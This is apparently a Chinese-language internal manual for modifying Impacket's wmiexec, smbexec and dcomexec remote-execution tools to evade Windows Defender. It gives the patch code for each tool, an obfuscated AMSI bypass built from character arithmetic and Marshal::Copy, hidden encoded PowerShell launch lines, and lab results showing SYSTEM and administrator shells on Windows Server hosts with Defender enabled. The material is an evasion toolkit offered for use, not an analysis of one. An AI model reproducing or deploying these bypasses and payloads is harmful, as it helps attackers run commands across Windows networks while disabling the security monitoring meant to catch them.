# Impacket 绕过技术手册

> v1.2 | 2026-05-16 | 三点改造：BXOR 编码 / AMSI 混淆绕过 / `-Enc` 统一传输
> 验证通过：Win2022 + Defender 开启，三工具 cmd/PS 全通

## 基础设定

- 改造目标：Impacket v0.11.0 → v0.11.0-evasive
- 改造范围：wmiexec / smbexec / dcomexec（PS 模式）
- 绕过目标：Defender AMSI / ETW / YARA / Sigma 规则
- 验证环境：Win2022 (Defender 开启) + Win2008 R2 (无 AMSI)
- 改造原则：加一个模块 + 每工具改 ~8 行，最小侵入

## 文件地图

```
impacket-0.11.0/
├── impacket/examples/evasive_encoder.py  ← 新增：BXOR 编码 + AMSI bypass
├── examples/
│   ├── smbexec.py          ← L287-293（PS 分支 ~7 行）
│   ├── wmiexec.py          ← L289-297（PS 分支 ~9 行）
│   ├── dcomexec.py         ← L271(_pwsh) + L438-447 + L515-524（PS 双类）
│   ├── psexec.py           ← 不可改（管道名固定）
│   └── services.py         ← 不可改
└── impacket-0.11.0_backup/ ← 原始备份
```

## evasive_encoder.py 方法清单

| 方法 | 用途 | 备注 |
|------|------|------|
| `encode(ps)` | BXOR 加密 → Base64 → 内联解码器 | 随机 key，每次不同 |
| `get_amsi_bypass()` | v1 反射版 AMSI bypass | ~200 char，未混淆 |
| `get_amsi_bypass_obfuscated()` | **v3 混淆版（推荐）** | 1093 char，char 算术全混淆 |
| `get_amsi_etw_bypass()` | Add-Type 合并 AMSI+ETW | VirtualProtect 路线（行为敏感） |

## AMSI Bypass 版本对比

| 版本 | 手法 | Win2022 | 大小 | 结论 |
|------|------|:---:|:---:|------|
| v1 | 反射 `*iUtils` + Marshal::Copy 清 Context | ✅ | ~200 | 可用但未混淆 |
| v2 | `amsiInitFailed=$true` | ❌ | ~50 | 自身含签名被先扫 |
| **v3** | **char 算术混淆 + Marshal::Copy 清 Context** | **✅** | **1093** | **推荐** |
| ~~旧 v3~~ | DynamicAssembly + VirtualProtect patch | ❌ | ~5000 | 行为检测拦截，已废弃 |

### v3 核心逻辑

```powershell
# Step 1: 反射找 AmsiUtils — 通配符 *iUtils 避开字面量
$a=[Ref].Assembly.GetTypes()
foreach($t in $a){if($t.Name -like '*'+[char](105)+[char](85)+...){$c=$t}}

# Step 2: 取 AmsiContext 字段 — 全部 char 算术构造
$f=$c.GetFields('NonPublic,Static')  # 也是 char 算术
foreach($x in $f){if($x.Name -like '*'+[char](67)+[char](111)+...){$ctx=$x}}

# Step 3: 清零 — Marshal::Copy，无需 VirtualProtect
[System.Runtime.InteropServices.Marshal]::Copy(@(0),0,$ctx.GetValue($null),1)
```

### 为什么不用 VirtualProtect

```
VirtualProtect(amsi.dll) → services.exe 父进程链 → Defender 行为引擎
    第 1 次 ✅ 放过 → 第 2 次 ❌ 拦截
NtProtectVirtualMemory → 同样被拦（检测的是 DLL 页属性修改行为本身）
Marshal::Copy 清 Context → 不走内存保护变更 → ✅ 不触发
```

## 各工具改造代码

### smbexec.py（L287-293）

```python
if shell_type == 'powershell':
    data = '$ProgressPreference="SilentlyContinue";' + data
    encoder = EvasivePayloadEncoder()
    encoded_cmd, _ = encoder.encode(data)
    amsi_bypass = EvasivePayloadEncoder.get_amsi_bypass_obfuscated()
    encoded_cmd = amsi_bypass + ';' + encoded_cmd
    import base64 as b64_enc
    b64_cmd = b64_enc.b64encode(encoded_cmd.encode('utf-16-le')).decode()
    data = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ' + b64_cmd
```

> `-Enc` 套壳绕过 `cmd.exe echo ... > batch` 特殊字符（`|>&%^`）问题。

### wmiexec.py（L289-297）

```python
if shell_type == 'powershell':
    data = '$ProgressPreference="SilentlyContinue";' + data
    encoder = EvasivePayloadEncoder()
    encoded_cmd, _ = encoder.encode(data)
    amsi_bypass = EvasivePayloadEncoder.get_amsi_bypass_obfuscated()
    encoded_cmd = amsi_bypass + ';' + encoded_cmd
    import base64 as b64_enc
    b64_cmd = b64_enc.b64encode(encoded_cmd.encode('utf-16-le')).decode()
    data = self.__pwsh + b64_cmd   # __pwsh = 'powershell.exe -NoP -NoL -sta ... -Enc '
```

> 原用 `-Command '...'`，payload 中单引号破坏 PS 语法。已统一为 `-Enc`。

### dcomexec.py（3 处）

**改 1 — L271 修复 name mangling：**
```python
# 改前: self.__pwsh = '...'
# 改后: self._pwsh = '...'
# 原因: __pwsh → _RemoteShell__pwsh，子类 RemoteShellMMC20 访问 AttributeError
```

**改 2 / 改 3 — L438-447 + L515-524（RemoteShell + RemoteShellMMC20 双类）：**

同 wmiexec，PS 分支使用 `self._pwsh + b64_cmd`。

## 实战验证

### Win2022（192.168.179.135）

| 项 | 值 |
|------|------|
| OS | Windows Server 2022 |
| Defender | ✅ 实时保护开启 |
| PowerShell | 5.1 |
| SMB | v3.0 |
| AMSI Bypass | v3 混淆版（1093 char） |

```
工具         cmd            PS            权限
──────────────────────────────────────────────────
smbexec      ✅             ✅             nt authority\system
wmiexec      ✅             ✅             win-tvhtvn1fl3s\administrator
dcomexec     ✅             ✅             win-tvhtvn1fl3s\administrator
```

### Win2008 R2（192.168.179.131）

| 项 | 值 |
|------|------|
| OS | Windows Server 2008 R2 Datacenter |
| Defender | ❌ 无 |
| PowerShell | 2.0（❌ 不兼容 BXOR） |

```
工具         cmd            PS             权限
──────────────────────────────────────────────────
smbexec      ✅             ❌ PS 2.0       nt authority\system
wmiexec      ✅             ❌ PS 2.0       Administrator
dcomexec     ✅             ❌ PS 2.0       Administrator
```

```
dcomexec CLSID:
  ShellWindows        ✅
  ShellBrowserWindow  ❌ REGDB_E_CLASSNOTREG（2008 未注册）
  MMC20               ✅
  → 随机化 2/3 命中，自动 fallback 重试
```

## 踩坑清单

| # | 坑 | 修复 |
|---|-----|------|
| 1 | `-Command '...'` 嵌套单引号 → PS 语法错误 | 统一 `-Enc` + base64 |
| 2 | smbexec `echo ... > batch` → `\|>&%` 被 cmd 误解析 | `-Enc` 套壳（base64 无特殊字符） |
| 3 | dcomexec `self.__pwsh` → 子类 name mangling `AttributeError` | 改 `self._pwsh` |
| 4 | 修改源码后 `pip install impacket` 不自动重装 | 必须 `pip uninstall -y && pip install .` |
| 5 | PS 2.0 无 `[ScriptBlock]::Create()` → BXOR 不可用 | cmd 模式回退 |
| 6 | `amsiInitFailed=$true` 自身含 `"AmsiUtils"` 签名 | 鸡生蛋，不可用 |
| 7 | VirtualProtect(amsi.dll) 第二次被 Defender 行为拦截 | 改用 Marshal::Copy 清 Context |
| 8 | 去注释压一行 → `(;` `,;` 破坏 PS 多行函数调用 | 保留多行结构 |
| 9 | `-Enc` 模式 `'→''` 转义多余 → 破坏 PS 语法 | 去掉转义 |
| 10 | ShellBrowserWindow Win2008 R2 未注册 | CLSID 随机化 + fallback |

## 限制与不可行项

```
✅ 可改造:    PS 脚本编码 / AMSI bypass / 命令行参数 / DCOM CLSID 随机化
⚠️ 环境依赖:  目标需 PS 3.0+（[ScriptBlock]::Create）、Win10+/2016+（AMSI 存在）
❌ 不可改:    \pipe\svcctl 管道名（SCM RPC 固定端点）
❌ 不实施:    RemComSvc.exe 重编译（C++ 改造性价比低）
```

## 部署

```bash
# 1. 卸载旧版
pip uninstall impacket -y

# 2. 从本地源码安装
cd F:\CC\网安\Tools\内网工具\域\impacket\impacket-0.11.0
pip install .

# 3. 验证
python -c "from impacket.examples.evasive_encoder import EvasivePayloadEncoder; print(EvasivePayloadEncoder.get_amsi_bypass_obfuscated()[:50])"
```
